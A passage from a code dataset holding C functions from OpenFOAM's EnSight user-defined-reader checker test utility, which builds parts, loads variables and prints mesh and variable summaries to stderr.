%g\\n\",extents[4]);\n    fprintf(stderr,\" Max z: %g\\n\",extents[5]);\n  }\n\n#endif\n\n  /* Free the allocated memory\n   *--------------------------*/\n  free(part_ids);\n  free(part_types);\n  free(number_of_nodes);\n\n  for(i=0; i<Num_parts; ++i) {\n    free(ijk_dimensions[i]);\n    free(num_elems[i]);\n    free(part_descriptions[i]);\n  }\n  free(ijk_dimensions);\n  free(num_elems);\n  free(iblanking_options);\n  free(part_descriptions);\n\n#if (defined GT_USERD_API_100)\n  for(i=0; i<Num_parts; ++i) {\n    free(max_ijk_dimensions[i]);\n    free(max_num_elems[i]);\n  }\n  free(max_num_nodes);\n  free(max_num_elems);\n  free(max_ijk_dimensions);\n\n#endif\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker-80.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*-------------\n * part_builder\n *-------------*/\n", "func_signal": "static int\npart_builder(int geom_time_step)", "code": "{\n  int i, j;\n  int err;\n  int p, pn;\n  int et, ne;\n  int *elemids[Z_MAXTYPE];\n  int **conns[Z_MAXTYPE];\n  int nn;\n  int comp;\n  int bdim[3];\n  int ib[5];\n  int num_dims;\n  int cell_type;\n  float mm[6];\n  float **coords;\n  int *nodeids;\n  int *iblanking;\n  CRD *crds;\n  int bd1,bd2,bd3;\n\n\n  fprintf(stderr,\"\\n------------- part_builder --------------\\n\");\n\n\n  if(Num_time_steps > 1) {\n    if(geom_time_step > (Num_time_steps - 1)) {\n      geom_time_step = Num_time_steps - 1;\n    }\n\n    /* Set the time step - to first step by default, but\n     * can set it at others using -gts command argument\n     *---------------------------------------------------*/\n    USERD_set_time_step(geom_time_step);\n\n    fprintf(stderr,\" Using time step: %d  (where range is %d through %d\\n\",\n            geom_time_step,0,Num_time_steps-1);\n  }\n\n\n  /* Get the global coords\n   *----------------------*/\n  nn = USERD_get_number_of_global_nodes();\n\n  if(nn > 0) {\n\n    crds = (CRD *) calloc(nn,sizeof(CRD));\n    if(crds == (CRD *) NULL) {\n      fprintf(stderr,\"Error: allocating crds array\\n\");\n      return(Z_ERR);\n    }\n\n    if(Node_labels) {\n      nodeids = (int *) calloc(nn,sizeof(int));\n      if(nodeids == (int *) NULL) {\n        fprintf(stderr,\"Error: allocating nodeids array\\n\");\n        return(Z_ERR);\n      }\n    }\n\n\n    err = USERD_get_global_coords(crds);\n    if(err == Z_ERR) {\n      fprintf(stderr,\"Error: getting unstructured coords\\n\");\n      return(Z_ERR);\n    }\n\n    if(Node_labels) {\n      err = USERD_get_global_node_ids(nodeids);\n      if(err == Z_ERR) {\n        fprintf(stderr,\"Error: getting nodeids\\n\");\n        return(Z_ERR);\n      }\n    }\n\n    /* Echo \"some\" info\n     *-----------------*/\n\n    /* First node\n     *-----------*/\n    i = 0;\n    fprintf(stderr,\"   Node %d of %d:\\n\",i+1,nn);\n    if(Node_labels) {\n      fprintf(stderr,\"      id: %d\\n\",nodeids[i]);\n    }\n    fprintf(stderr,\"      x y z coordinates: %g %g %g\\n\",\n            crds[i].xyz[0], crds[i].xyz[1], crds[i].xyz[2]);\n    mm[0] = mm[1] = crds[i].xyz[0];\n    mm[2] = mm[3] = crds[i].xyz[1];\n    mm[4] = mm[5] = crds[i].xyz[2];\n\n\n    /* Last node\n     *----------*/\n    i = nn-1;\n    if(i > 0) {\n      fprintf(stderr,\"   Node %d of %d:\\n\",i+1,nn);\n      if(Node_labels) {\n        fprintf(stderr,\"      id: %d\\n\",nodeids[i]);\n      }\n      fprintf(stderr,\"      x y z coordinates: %g %g %g\\n\",\n              crds[i].xyz[0], crds[i].xyz[1], crds[i].xyz[2]);\n    }\n\n    /* Min and max coordinate values\n     *------------------------------*/\n    for(i=1; i<nn; ++i) {\n      if(crds[i].xyz[0] < mm[0]) {\n        mm[0] = crds[i].xyz[0];\n      }\n      if(crds[i].xyz[0] > mm[1]) {\n        mm[1] = crds[i].xyz[0];\n      }\n      if(crds[i].xyz[1] < mm[2]) {\n        mm[2] = crds[i].xyz[1];\n      }\n      if(crds[i].xyz[1] > mm[3]) {\n        mm[3] = crds[i].xyz[1];\n      }\n      if(crds[i].xyz[2] < mm[4]) {\n        mm[4] = crds[i].xyz[2];\n      }\n      if(crds[i].xyz[2] > mm[5]) {\n        mm[5] = crds[i].xyz[2];\n      }\n    }\n\n    fprintf(stderr,\"   Global coordinate ranges:\\n\");\n    fprintf(stderr,\"      min x: %g\\n\",mm[0]);\n    fprintf(stderr,\"      max x: %g\\n\",mm[1]);\n    fprintf(stderr,\"      min y: %g\\n\",mm[2]);\n    fprintf(stderr,\"      max y: %g\\n\",mm[3]);\n    fprintf(stderr,\"      min z: %g\\n\",mm[4]);\n    fprintf(stderr,\"      max z: %g\\n\",mm[5]);\n\n\n    /* Free the allocated memory\n     *--------------------------*/\n    free(crds);\n    if(Node_labels) {\n      free(nodeids);\n    }\n  }\n\n\n\n  for(p=0; p<Num_parts; ++p) {\n    pn = p+1;\n\n    fprintf(stderr,\"\\n\");\n    fprintf(stderr,\" Part %d:\\n\",pn);\n\n    /*-----------------------\n     * For unstructured parts\n     *-----------------------*/\n    if(Pbuild[p].type == Z_UNSTRUCTURED) {\n\n      for(et=0; et<Z_MAXTYPE; ++et) {\n        ne = Pbuild[p].ne[et];\n\n        if(ne > 0) {\n\n          conns[et] = (int **) calloc(ne,sizeof(int *));\n          if(conns[et] == (int **) NULL) {\n            fprintf(stderr,\"Error: allocating conns array\\n\");\n            return(Z_ERR);\n          }\n          else {\n            for(i=0; i<ne; ++i) {\n              conns[et][i] = (int *) calloc(Elem_info[et].con_len,sizeof(int));\n              if(conns[et][i] == (int *) NULL) {\n                fprintf(stderr,\"Error: allocating conns array\\n\");\n                return(Z_ERR);\n              }\n            }\n          }\n\n          if(Element_labels) {\n            elemids[et] = (int *) calloc(ne,sizeof(int));\n            if(elemids[et] == (int *) NULL) {\n              fprintf(stderr,\"Error: allocating elemids array\\n\");\n              return(Z_ERR);\n            }\n          }\n        }\n      }\n\n      /* Get the elements\n       *-----------------*/\n      err = USERD_get_element_connectivities_for_part(pn,conns);\n      if(err == Z_ERR) {\n        fprintf(stderr,\"Error: getting element connectivities\\n\");\n        return(Z_ERR);\n      }\n\n      /* Get the element ids - if any\n       *-----------------------------*/\n      if(Element_labels) {\n        err = USERD_get_element_ids_for_part(pn,elemids);\n        if(err == Z_ERR) {\n          fprintf(stderr,\"Error: getting element ids\\n\");\n          return(Z_ERR);\n        }\n      }\n\n      /* Echo \"some\" info\n       *-----------------*/\n      for(et=0; et<Z_MAXTYPE; ++et) {\n        ne = Pbuild[p].ne[et];\n\n        if(ne > 0) {\n\n          /* First element of the type\n           *--------------------------*/\n          i = 0;\n          fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n          if(Element_labels) {\n            fprintf(stderr,\"      id: %d\\n\",elemids[et][i]);\n          }\n          fprintf(stderr,\"      connectivity:\");\n          for(j=0; j<Elem_info[et].con_len; ++j) {\n            fprintf(stderr,\" %d\",conns[et][i][j]);\n          }\n          fprintf(stderr,\"\\n\");\n\n          /* Last element of the type\n           *-------------------------*/\n          i = ne - 1;\n          if(i > 0) {\n            fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n            if(Element_labels) {\n              fprintf(stderr,\"      id: %d\\n\",elemids[et][i]);\n            }\n            fprintf(stderr,\"      connectivity:\");\n            for(j=0; j<Elem_info[et].con_len; ++j) {\n              fprintf(stderr,\" %d\",conns[et][i][j]);\n            }\n            fprintf(stderr,\"\\n\");\n          }\n        }\n      }\n\n      /* Free the allocated memory\n       *--------------------------*/\n      for(et=0; et<Z_MAXTYPE; ++et) {\n        ne = Pbuild[p].ne[et];\n\n        if(ne > 0) {\n          for(i=0; i<ne; ++i) {\n            free(conns[et][i]);\n          }\n          free(conns[et]);\n\n          if(Element_labels) {\n            free(elemids[et]);\n          }\n        }\n      }\n    }\n\n\n    /*---------------------\n     * For structured parts\n     *---------------------*/\n    else {\n\n      /* Get the block coords\n       *---------------------*/\n      for(comp=0; comp<3; ++comp) {\n        if(Pbuild[p].ne[comp] < 1) {\n          bdim[comp] = 1;\n        }\n        else {\n          bdim[comp] = Pbuild[p].ne[comp];\n        }\n      }\n      nn = bdim[0] * bdim[1] * bdim[2];\n\n      bd1 = bdim[0]-1;\n      if(bd1 < 1) {\n        bd1 = 1;\n      }\n      bd2 = bdim[1]-1;\n      if(bd2 < 1) {\n        bd2 = 1;\n      }\n      bd3 = bdim[2]-1;\n      if(bd3 < 1) {\n        bd3 = 1;\n      }\n      ne = bd1 * bd2 * bd3;\n\n\n      /* Determine cell type\n       *--------------------*/\n      num_dims = 3;\n      for(i=0; i<3; ++i) {\n        if(bdim[i] == 1) {\n          --num_dims;\n        }\n      }\n      if(num_dims == 3) {\n        cell_type = Z_HEX08;\n      }\n      else if(num_dims == 2) {\n        cell_type = Z_QUA04;\n      }\n      else {\n        cell_type = Z_BAR02;\n      }\n\n      coords = (float **) calloc(num_dims,sizeof(float *));\n      if(coords == (float **) NULL) {\n        fprintf(stderr,\"Error: allocating coords array\\n\");\n        return(Z_ERR);\n      }\n      else {\n        for(i=0; i<num_dims; ++i) {\n          coords[i] = (float *) calloc(nn,sizeof(float));\n          if(coords[i] == (float *) NULL) {\n            fprintf(stderr,\"Error: allocating coords array\\n\");\n            return(Z_ERR);\n          }\n        }\n      }\n\n      /* Get the coords\n       *---------------*/\n      for(comp=0; comp<num_dims; ++comp) {\n        err = USERD_get_block_coords_by_component(pn,comp,coords[comp]);\n        if(err == Z_ERR) {\n          fprintf(stderr,\"Error: getting block coords\\n\");\n          return(Z_ERR);\n        }\n      }\n\n\n      /* Echo \"some\" info\n       *-----------------*/\n\n      /* First node\n       *-----------*/\n      if(nn > 0) {\n        i = 0;\n        fprintf(stderr,\"   Node %d of %d:\\n\",i+1,nn);\n\n        if(num_dims == 3) {\n          fprintf(stderr,\"      x y z coordinates: %g %g %g\\n\",\n                  coords[0][i], coords[1][i], coords[2][i]);\n          mm[0] = mm[1] = coords[0][i];\n          mm[2] = mm[3] = coords[1][i];\n          mm[4] = mm[5] = coords[2][i];\n        }\n        else if(num_dims == 2) {\n          fprintf(stderr,\"      x y coordinates: %g %g\\n\",\n                  coords[0][i], coords[1][i]);\n          mm[0] = mm[1] = coords[0][i];\n          mm[2] = mm[3] = coords[1][i];\n        }\n        else {\n          fprintf(stderr,\"      x coordinates: %g\\n\",\n                  coords[0][i]);\n          mm[0] = mm[1] = coords[0][i];\n        }\n\n\n        /* Last node\n         *----------*/\n        i = nn-1;\n        if(i > 1) {\n          fprintf(stderr,\"   Node %d of %d:\\n\",i+1,nn);\n\n          if(num_dims == 3) {\n            fprintf(stderr,\"      x y z coordinates: %g %g %g\\n\",\n                    coords[0][i], coords[1][i], coords[2][i]);\n          }\n          else if(num_dims == 2) {\n            fprintf(stderr,\"      x y coordinates: %g %g\\n\",\n                    coords[0][i], coords[1][i]);\n          }\n          else {\n            fprintf(stderr,\"      x coordinates: %g\\n\",\n                    coords[0][i]);\n          }\n        }\n      }\n\n      /* Min and max coordinate values\n       *------------------------------*/\n      for(i=2; i<=nn; ++i) {\n        if(coords[0][i] < mm[0]) {\n          mm[0] = coords[0][i];\n        }\n        if(coords[0][i] > mm[1]) {\n          mm[1] = coords[0][i];\n        }\n        if(num_dims > 1) {\n          if(coords[1][i] < mm[2]) {\n            mm[2] = coords[1][i];\n          }\n          if(coords[1][i] > mm[3]) {\n            mm[3] = coords[1][i];\n          }\n        }\n        if(num_dims > 2) {\n          if(coords[2][i] < mm[4]) {\n            mm[4] = coords[2][i];\n          }\n          if(coords[2][i] > mm[5]) {\n            mm[5] = coords[2][i];\n          }\n        }\n      }\n\n      fprintf(stderr,\"   Coordinate ranges:\\n\");\n      fprintf(stderr,\"      min x: %g\\n\",mm[0]);\n      fprintf(stderr,\"      max x: %g\\n\",mm[1]);\n      if(num_dims > 1) {\n        fprintf(stderr,\"      min y: %g\\n\",mm[2]);\n        fprintf(stderr,\"      max y: %g\\n\",mm[3]);\n      }\n      if(num_dims > 2) {\n        fprintf(stderr,\"      min z: %g\\n\",mm[4]);\n        fprintf(stderr,\"      max z: %g\\n\",mm[5]);\n      }\n\n      /* Free the allocated memory - so far\n       *-----------------------------------*/\n      for(i=0; i<num_dims; ++i) {\n        free(coords[i]);\n      }\n      free(coords);\n\n\n      /* Get the block iblanking - if any\n       *---------------------------------*/\n      if(Pbuild[p].type == Z_IBLANKED) {\n\n        iblanking = (int *) calloc(nn,sizeof(int));\n        if(iblanking == (int *) NULL) {\n          fprintf(stderr,\"Error: allocating iblanking array\\n\");\n          return(Z_ERR);\n        }\n\n        err = USERD_get_block_iblanking(pn,iblanking);\n        if(err == Z_ERR) {\n          fprintf(stderr,\"Error: getting block iblanking\\n\");\n          return(Z_ERR);\n        }\n\n        /* Echo \"some\" info\n         *-----------------*/\n        ib[Z_EXT]    = 0;\n        ib[Z_INT]    = 0;\n        ib[Z_BND]    = 0;\n        ib[Z_INTBND] = 0;\n        ib[Z_SYM]    = 0;\n\n        for(i=0; i<nn; ++i) {\n          ++ib[iblanking[i]];\n        }\n\n        fprintf(stderr,\"   Iblanking breakdown:\\n\");\n        fprintf(stderr,\"      Number of Z_EXT:    %d\\n\",ib[Z_EXT]);\n        fprintf(stderr,\"      Number of Z_INT:    %d\\n\",ib[Z_INT]);\n        fprintf(stderr,\"      Number of Z_BND:    %d\\n\",ib[Z_BND]);\n        fprintf(stderr,\"      Number of Z_INTBND: %d\\n\",ib[Z_INTBND]);\n        fprintf(stderr,\"      Number of Z_SYM:    %d\\n\",ib[Z_SYM]);\n\n        free(iblanking);\n      }\n    }\n  }\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*--------------\n * Usage routine\n *--------------*/\n", "func_signal": "static void\nusage( void )", "code": "{\n  fprintf(stderr,\"------------------------------------------------------------\\n\");\n  fprintf(stderr,\"USAGE: checker [-p pfile] [-server_number] [-gts #] [-vts #]\\n\");\n  fprintf(stderr,\"------------------------------------------------------------\\n\");\n  fprintf(stderr,\"  -h, -help       Prints out this USAGE text.\\n\");\n  fprintf(stderr,\"  -gts #          Specify the geometry times step to use.)\\n\");\n  fprintf(stderr,\"  -p pfile        Plays the checker playfile (pfile).\\n\");\n  fprintf(stderr,\"  -server_number  Cause servers numbers to be prompted for.\\n\");\n  fprintf(stderr,\"  -vts #          Specify the variable times step to use.)\\n\");\n  fprintf(stderr,\"\\n\");\n  exit(1);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker-80.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*----------------\n * gold_var_loader\n *----------------*/\n", "func_signal": "static int\ngold_var_loader(int var_time_step)", "code": "{\n  int i, j;\n  int err;\n  int v, vn;\n  int var_timeset;\n  int p, pn;\n  int et, e1, e2;\n  int num_comps;\n  int num_dims;\n  int nsize;\n  int comp;\n  int bdim[3];\n  int ne;\n  int cell_type;\n  float constant_val;\n  char line1[Z_BUFL];\n  char line2[Z_BUFL];\n  float *values;\n  float minv,maxv;\n  int bd1,bd2,bd3;\n\n\n  fprintf(stderr,\"\\n--------------- var_loader --------------\\n\");\n\n  for(v=0; v<Num_vars; ++v) {\n    vn = v + 1;\n\n    if(v > 0) {\n      fprintf(stderr,\"\\n\");\n    }\n    if(Varinfo[v].classify == Z_PER_NODE) {\n      fprintf(stderr,\" Z_PER_NODE Variable %d:\\n\",vn);\n    }\n    else {\n      fprintf(stderr,\" Z_PER_ELEM Variable %d:\\n\",vn);\n    }\n\n\n    if(Num_time_sets > 0) {\n      /* Get the timeset used for the variable\n       *---------------------------------------*/\n      var_timeset = Varinfo[v].timeset;\n\n      /* Get the number of time steps for this timeset\n       *----------------------------------------------*/\n      Num_time_steps = USERD_get_num_of_time_steps(var_timeset);\n      if(Num_time_steps < 1) {\n        fprintf(stderr,\" Error: Number of time steps returned: %d\\n\",\n                Num_time_steps);\n        fprintf(stderr,\" (Must be >0 to be okay)\\n\");\n        return(Z_ERR);\n      }\n      if(var_time_step > (Num_time_steps - 1)) {\n        var_time_step = Num_time_steps - 1;\n      }\n\n      /* Set the timeset and step - to first step by default, but\n       * can set it at others using -vts command argument\n       *---------------------------------------------------------*/\n      USERD_set_time_set_and_step(var_timeset,var_time_step);\n\n      fprintf(stderr,\"   Using timeset:   %d  (step range is %d through %d)\\n\",\n              var_timeset,0,Num_time_steps-1);\n      fprintf(stderr,\"   Using time step: %d\\n\",var_time_step);\n    }\n\n\n    /* Constants\n     *----------*/\n    if(Varinfo[v].type == Z_CONSTANT) {\n\n      constant_val = USERD_get_constant_val(vn,FALSE);\n      fprintf(stderr,\"   Constant (%s):\\n\",Varinfo[v].description);\n      fprintf(stderr,\"     value: %g\\n\",constant_val);\n\n      if(Varinfo[v].complex) {\n        constant_val = USERD_get_constant_val(vn,TRUE);\n        fprintf(stderr,\"   value (imag): %g\\n\",constant_val);\n      }\n    }\n\n    /* Scalars, Vectors, Tensors\n     *--------------------------*/\n    else {\n\n      /* Get the var description line\n       *-----------------------------*/\n      err = USERD_get_descrip_lines(Z_VARI,vn,FALSE,line1,line2);\n      if(err == Z_OK) {\n        fprintf(stderr,\"   Desc line: %s\\n\",line1);\n      }\n      else {\n        fprintf(stderr,\"Error: getting var description line\\n\");\n        return(Z_ERR);\n      }\n\n      if(Varinfo[v].complex) {\n        err = USERD_get_descrip_lines(Z_VARI,vn,TRUE,line1,line2);\n        if(err == Z_OK) {\n          fprintf(stderr,\"   Desc line (imag): %s\\n\",line1);\n        }\n        else {\n          fprintf(stderr,\"Error: getting var description line (imag)\\n\");\n          return(Z_ERR);\n        }\n      }\n\n\n      /* Get the values by component\n       *-----------------------------*/\n      if(Varinfo[v].type == Z_SCALAR) {\n        num_comps = 1;\n      }\n      else if(Varinfo[v].type == Z_VECTOR) {\n        num_comps = 3;\n      }\n      else if(Varinfo[v].type == Z_TENSOR) {\n        num_comps = 6;\n      }\n      else if(Varinfo[v].type == Z_TENSOR9) {\n        num_comps = 9;\n      }\n\n\n      /* Per_Node\n       *---------*/\n      if(Varinfo[v].classify == Z_PER_NODE) {\n\n        for(p=0; p<Num_parts; ++p) {\n          pn = p + 1;\n\n          if(Pbuild[p].type == Z_UNSTRUCTURED) {\n            nsize = Pbuild[p].nn;\n          }\n          else {\n            for(comp=0; comp<3; ++comp) {\n              if(Pbuild[p].ne[comp] < 1) {\n                bdim[comp] = 1;\n              }\n              else {\n                bdim[comp] = Pbuild[p].ne[comp];\n              }\n            }\n            nsize = bdim[0] * bdim[1] * bdim[2];\n          }\n\n\n          fprintf(stderr,\"   For part %d, with %d nodes:\\n\",pn,nsize);\n\n          if(nsize > 0) {\n            values = (float *) calloc((nsize+1),sizeof(float));\n            if(values == (float *) NULL) {\n              fprintf(stderr,\"Error: alocating variable values\\n\");\n              return(Z_ERR);\n            }\n\n            for(comp=0; comp<num_comps; ++comp) {\n\n              err = USERD_get_var_by_component(vn,\n                                               pn,\n                                               Varinfo[v].type,\n                                               0,\n                                               FALSE,\n                                               comp,\n                                               values);\n              if(err == Z_UNDEF) {\n                fprintf(stderr,\"  Variable not defined on this part\\n\");\n              }\n\n\n              /* For the component, show 1st node, last node, min, max values\n               *-------------------------------------------------------------*/\n              minv = maxv = values[1];\n              for(i=2; i<=nsize; ++i) {\n                if(values[i] < minv) {\n                  minv = values[i];\n                }\n                if(values[i] > maxv) {\n                  maxv = values[i];\n                }\n              }\n\n              fprintf(stderr,\"     For component %d: \\n\",comp);\n              fprintf(stderr,\"       node %10d value:   %g\\n\",1,values[1]);\n              fprintf(stderr,\"       node %10d value:   %g\\n\",nsize,values[nsize]);\n              fprintf(stderr,\"       min value:               %g\\n\",minv);\n              fprintf(stderr,\"       max value:               %g\\n\",maxv);\n\n              if(Varinfo[v].complex) {\n                err = USERD_get_var_by_component(vn,\n                                                 pn,\n                                                 Varinfo[v].type,\n                                                 0,\n                                                 FALSE,\n                                                 comp,\n                                                 values);\n                if(err == Z_UNDEF) {\n                  fprintf(stderr,\"  Variable not defined on this part\\n\");\n                }\n\n                /* For the component, show 1st node, last node, min, max values\n                 *-------------------------------------------------------------*/\n                minv = maxv = values[1];\n                for(i=2; i<=nsize; ++i) {\n                  if(values[i] < minv) {\n                    minv = values[i];\n                  }\n                  if(values[i] > maxv) {\n                    maxv = values[i];\n                  }\n                }\n\n                fprintf(stderr,\"     For component %d (imag): \\n\",comp);\n                fprintf(stderr,\"       node %10d value:   %g\\n\",1,values[1]);\n                fprintf(stderr,\"       node %10d value:   %g\\n\",nsize,values[nsize]);\n                fprintf(stderr,\"       min value:               %g\\n\",minv);\n                fprintf(stderr,\"       max value:               %g\\n\",maxv);\n              }\n            }\n            free(values);\n          }\n        }\n      }\n\n      /* Per_Elem\n       *---------*/\n      else {\n        for(p=0; p<Num_parts; ++p) {\n          pn = p + 1;\n\n          if(Pbuild[p].type != Z_UNSTRUCTURED) {\n\n            for(comp=0; comp<3; ++comp) {\n              if(Pbuild[p].ne[comp] < 1) {\n                bdim[comp] = 1;\n              }\n              else {\n                bdim[comp] = Pbuild[p].ne[comp];\n              }\n            }\n\n            bd1 = bdim[0]-1;\n            if(bd1 < 1) {\n              bd1 = 1;\n            }\n            bd2 = bdim[1]-1;\n            if(bd2 < 1) {\n              bd2 = 1;\n            }\n            bd3 = bdim[2]-1;\n            if(bd3 < 1) {\n              bd3 = 1;\n            }\n            nsize = bd1 * bd2 * bd3;\n\n\n            /* Determine cell type\n             *--------------------*/\n            num_dims = 3;\n            for(i=0; i<3; ++i) {\n              if(bdim[i] == 1) {\n                --num_dims;\n              }\n            }\n            if(num_dims == 3) {\n              cell_type = Z_HEX08;\n            }\n            else if(num_dims == 2) {\n              cell_type = Z_QUA04;\n            }\n            else {\n              cell_type = Z_BAR02;\n            }\n          }\n\n          if(Pbuild[p].type == Z_UNSTRUCTURED) {\n            e1 = 0;\n            e2 = Z_MAXTYPE-1;\n          }\n          else {\n            e1 = e2 = cell_type;\n          }\n\n          for(et=e1; et<=e2; ++et) {\n\n            if(Pbuild[p].type == Z_UNSTRUCTURED) {\n              nsize = Pbuild[p].ne[et];\n            }\n\n            if(nsize > 0) {\n\n              fprintf(stderr,\"   For part %d, with %d elems of type %s:\\n\",\n                      pn,nsize,Elem_info[et].name);\n\n\n              values = (float *) calloc((nsize+1),sizeof(float));\n              if(values == (float *) NULL) {\n                fprintf(stderr,\"Error: alocating variable values\\n\");\n                return(Z_ERR);\n              }\n\n              for(comp=0; comp<num_comps; ++comp) {\n\n                err = USERD_get_var_by_component(vn,\n                                                 pn,\n                                                 Varinfo[v].type,\n                                                 et,\n                                                 FALSE,\n                                                 comp,\n                                                 values);\n                if(err == Z_UNDEF) {\n                  fprintf(stderr,\"  Variable not defined on this part\\n\");\n                }\n\n                /* For the component, show 1st elem, last elem, min, max values\n                 *-------------------------------------------------------------*/\n                minv = maxv = values[1];\n                for(i=2; i<=nsize; ++i) {\n                  if(values[i] < minv) {\n                    minv = values[i];\n                  }\n                  if(values[i] > maxv) {\n                    maxv = values[i];\n                  }\n                }\n\n                fprintf(stderr,\"     For component %d: \\n\",comp);\n                fprintf(stderr,\"       elem %10d value:  %g\\n\",1,values[1]);\n                fprintf(stderr,\"       elem %10d value:  %g\\n\",nsize,values[nsize]);\n                fprintf(stderr,\"       min value:              %g\\n\",minv);\n                fprintf(stderr,\"       max value:              %g\\n\",maxv);\n\n                if(Varinfo[v].complex) {\n                  err = USERD_get_var_by_component(vn,\n                                                   pn,\n                                                   Varinfo[v].type,\n                                                   et,\n                                                   FALSE,\n                                                   comp,\n                                                   values);\n                  if(err == Z_UNDEF) {\n                    fprintf(stderr,\"  Variable not defined on this part\\n\");\n                  }\n\n                  /* For the component, show 1st elem, last elem, min, max values\n                   *-------------------------------------------------------------*/\n                  minv = maxv = values[1];\n                  for(i=2; i<=nsize; ++i) {\n                    if(values[i] < minv) {\n                      minv = values[i];\n                    }\n                    if(values[i] > maxv) {\n                      maxv = values[i];\n                    }\n                  }\n\n                  fprintf(stderr,\"     For component %d (imag): \\n\",comp);\n                  fprintf(stderr,\"       elem %10d value:  %g\\n\",1,values[1]);\n                  fprintf(stderr,\"       elem %10d value:  %g\\n\",nsize,values[nsize]);\n                  fprintf(stderr,\"       min value:              %g\\n\",minv);\n                  fprintf(stderr,\"       max value:              %g\\n\",maxv);\n\n                }\n              }\n              free(values);\n            }\n          }\n        }\n      }\n    }\n  }\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker-80.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*------------------\n * gold_part_builder\n *------------------*/\n", "func_signal": "static int\ngold_part_builder(int geom_time_step)", "code": "{\n  int i, j, k, jj, kk;\n  int err;\n  int geom_timeset;\n  int p, pn;\n  int et, ne;\n  int *elemids;\n  int **conns;\n  int nn;\n  int comp;\n  int bdim[3];\n  int ib[5];\n  int num_ghosts;\n  int num_dims;\n  int cell_type;\n  float mm[6];\n  float **coords;\n  int *nodeids;\n  int *iblanking;\n  int *ghost_flag;\n  short *parent_type;\n  int *parent_num;\n  int num_elems[Z_MAXTYPE];\n  CRD *crds;\n  int bd1,bd2,bd3;\n  int empty_part;\n  int *pdata;\n  int nsid_len;\n  int *nsid_con;\n  int nface_len;\n  int *nface_con;\n  int npf_len;\n  int *npf_con;\n  int maxcheck;\n  int num_failed = 0;\n  int *fail_flags = (int *) NULL;\n\n  fprintf(stderr,\"\\n------------- part_builder --------------\\n\");\n\n  if(Num_time_sets > 0) {\n    /* Get the timeset used for the geometry\n     *--------------------------------------*/\n    geom_timeset = USERD_get_geom_timeset_number();\n\n    /* Get the number of time steps for this timeset\n     *----------------------------------------------*/\n    Num_time_steps = USERD_get_num_of_time_steps(geom_timeset);\n    if(Num_time_steps < 1) {\n      fprintf(stderr,\" Error: Number of time steps returned: %d\\n\",Num_time_steps);\n      fprintf(stderr,\" (Must be >0 to be okay)\\n\");\n      return(Z_ERR);\n    }\n    if(geom_time_step > (Num_time_steps - 1)) {\n      geom_time_step = Num_time_steps - 1;\n    }\n\n    /* Set the timeset and step - to first step by default, but\n     * can set it at others using -gts command argument\n     *---------------------------------------------------------*/\n    USERD_set_time_set_and_step(geom_timeset,geom_time_step);\n\n    fprintf(stderr,\" Using timeset:   %d  (step range is %d through %d)\\n\",\n            geom_timeset,0,Num_time_steps-1);\n    fprintf(stderr,\" Using time step: %d\\n\",geom_time_step);\n  }\n\n  for(p=0; p<Num_parts; ++p) {\n    pn = p+1;\n\n    fprintf(stderr,\"\\n\\n----------------------------------------\");\n    fprintf(stderr,\" Part %d:\\n\",pn);\n\n    /*-----------------------\n     * For unstructured parts\n     *-----------------------*/\n    if(Pbuild[p].type == Z_UNSTRUCTURED) {\n\n      for(et=0; et<Z_MAXTYPE; ++et) {\n        ne = Pbuild[p].ne[et];\n\n        if(ne > 0) {\n\n          pdata = (int *)calloc(ne*Elem_info[et].con_len,sizeof(int));\n          if(pdata == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating conns array\\n\");\n            return(Z_ERR);\n          }\n          else {\n            conns = (int **) calloc(ne,sizeof(int *));\n            if(conns == (int **) NULL) {\n              fprintf(stderr,\"Error: allocating conns array\\n\");\n              return(Z_ERR);\n            }\n            for(i=0; i<ne; ++i) {\n              conns[i] = pdata;\n              pdata += Elem_info[et].con_len;\n            }\n          }\n\n\n          /* Get the elements\n           *-----------------*/\n          err = USERD_get_part_elements_by_type(pn,et,conns);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting element connectivities\\n\");\n            return(Z_ERR);\n          }\n\n          if(Element_labels) {\n            elemids = (int *) calloc(ne,sizeof(int));\n            if(elemids == (int *) NULL) {\n              fprintf(stderr,\"Error: allocating elemids array\\n\");\n              return(Z_ERR);\n            }\n          }\n\n          /* Get the element ids - if any\n           *-----------------------------*/\n          if(Element_labels) {\n            err = USERD_get_part_element_ids_by_type(pn,et,elemids);\n            if(err == Z_ERR) {\n              fprintf(stderr,\"Error: getting element ids\\n\");\n              return(Z_ERR);\n            }\n          }\n\n          /* Echo \"some\" info\n           *-----------------*/\n\n#if (defined GT_USERD_API_202)\n\n          maxcheck = Z_NSIDED;\n\n          /* Nsided elements, if any\n           *------------------------*/\n          if(et == Z_NSIDED ||\n             et == Z_G_NSIDED) {\n\n            nsid_len = 0;\n            for(i=0; i<ne; ++i) {\n              nsid_len += conns[i][0];\n            }\n\n            nsid_con = (int *) calloc(nsid_len,sizeof(int));\n            if(nsid_con == (int *) NULL) {\n              fprintf(stderr,\"Error: allocating nsided conn array\\n\");\n              return(Z_ERR);\n            }\n\n            err = USERD_get_nsided_conn(pn,nsid_con);\n            if(err == Z_ERR) {\n              fprintf(stderr,\"Error: getting nsided conn array\\n\");\n              return(Z_ERR);\n            }\n\n            /* First element of the type\n             *--------------------------*/\n            i = 0;\n            fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n            if(Element_labels) {\n              fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n            }\n            fprintf(stderr,\"      connectivity:\");\n            for(j=0; j<conns[i][0]; ++j) {\n              fprintf(stderr,\" %d\",nsid_con[j]);\n            }\n            fprintf(stderr,\"\\n\");\n\n            /* Last element of the type\n             *-------------------------*/\n            